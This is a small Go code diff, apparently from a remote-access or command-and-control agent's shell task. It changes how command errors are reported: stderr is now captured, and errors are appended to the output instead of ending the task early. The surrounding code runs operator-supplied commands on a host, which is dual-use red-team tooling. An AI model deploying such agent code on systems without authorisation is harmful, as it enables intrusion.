@@ -38,16 +38,8 @@ func Run(task structs.Task) {
 	cmd.Stdin = strings.NewReader(task.Params)
 	var out bytes.Buffer
 	cmd.Stdout = &out
+	cmd.Stderr = &out
 	err := cmd.Run()
-	if err != nil {
-		msg.SetError(err.Error())
-		resp, _ := json.Marshal(msg)
-		mu.Lock()
-		profiles.TaskResponses = append(profiles.TaskResponses, resp)
-		mu.Unlock()
-		return
-	}
-
 	var outputString string
 	if out.String() == "" {
 		outputString = "Command processed (no output)."
@@ -56,6 +48,10 @@ func Run(task structs.Task) {
 	}
 	msg.UserOutput = outputString
 	msg.Completed = true
+	if err != nil {
+	    msg.Status = "error"
+	    msg.UserOutput += "\n" + err.Error()
+	}
 	resp, _ := json.Marshal(msg)
 	mu.Lock()
 	profiles.TaskResponses = append(profiles.TaskResponses, resp)
